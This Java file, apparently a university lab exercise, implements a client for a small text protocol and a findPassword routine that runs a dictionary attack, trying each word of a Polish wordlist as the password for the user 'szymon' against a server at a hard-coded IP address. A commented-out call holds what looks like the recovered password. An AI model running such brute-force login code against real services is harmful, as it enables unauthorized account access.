package lab8;

import java.io.*;
import java.net.*;

public class EchoClient {
	private Socket echoSocket = null;
	private PrintWriter out = null;
	private BufferedReader in = null;
	private String ID = null;
	private String[] files = null;

	public static void main(String[] args) {
		EchoClient haha = new EchoClient();
		haha.findPassword();
		System.out.println("Finito");
		// try {
		// haha.loginToServer("szymon", "zadźwigany");
		// haha.ls();
		// } catch (IOException e) {
		// e.printStackTrace(System.out);
		// }
	}

	public void connect() {
		try {
			echoSocket = new Socket("149.156.98.73", 3000);
			out = new PrintWriter(echoSocket.getOutputStream(), true);
			in = new BufferedReader(new InputStreamReader(
					echoSocket.getInputStream()));
		} catch (UnknownHostException e) {
			System.err.println("Don't know about host: localhost.");
			System.exit(1);
		} catch (IOException e) {
			System.err.println("Couldn't get I/O for "
					+ "the connection to: localhost.");
			System.exit(1);
		}
	}

	public void closeAll() throws IOException {
		if (out != null)
			out.close();
		if (in != null)
			in.close();
		if (echoSocket != null)
			echoSocket.close();
	}

	public boolean loginToServer(String login, String password)
			throws IOException {
		connect();
		out.println("LOGIN " + login + ";" + password);
		String result = in.readLine();
		System.out.println("echo: " + result);
		closeAll();

		if (result.equals("false")) {
			return false;
		} else {
			ID = result;
			return true;
		}
	}

	public boolean logout() throws IOException {
		connect();
		out.println("LOGOUT " + ID);
		String result = in.readLine();
		System.out.println("echo: " + result);
		closeAll();
		return !result.equals("false");
	}

	public boolean ls() throws IOException {
		connect();
		out.println("LS " + ID);
		String result = in.readLine();
		System.out.println("echo: " + result);
		closeAll();
		if (result.equals("false"))
			return false;
		files = result.split(";");
		return true;
	}

	public boolean get(int number) throws IOException {
		String result = null;
		connect();
		if (files != null) {
			if (number >= 0 || number < files.length) {
				out.println("GET " + ID + " " + files[number]);
				result = in.readLine();
				System.out.println("echo: " + result);
			}
		}
		closeAll();
		return !result.equals("false");
	}

	public void findPassword() {
		try {
			FileInputStream fstream = new FileInputStream("polish-dic.txt");
			DataInputStream inn = new DataInputStream(fstream);
			BufferedReader br = new BufferedReader(new InputStreamReader(inn));
			String strLine;
			int i = 0;
			boolean flag = false;
			while ((strLine = br.readLine()) != null) {
				if (strLine.contains("zadźwigany")) {
					flag = true;
				}
				if (flag) {
					System.out.println(strLine);
					connect();
					strLine = strLine.split("/")[0];
					// System.out.println(strLine);
					out.println("LOGIN szymon;" + strLine);
					out.flush();
					String result = in.readLine();

					if (i % 1000 == 0) {
						System.out.println(i);
					}

					if (!result.equals("false")) {
						System.out.println(strLine);
						break;
					}
					i++;
				}
				closeAll();
			}
		} catch (IOException e) {
			System.err.println("Error: " + e.getMessage());
		}
	}
}
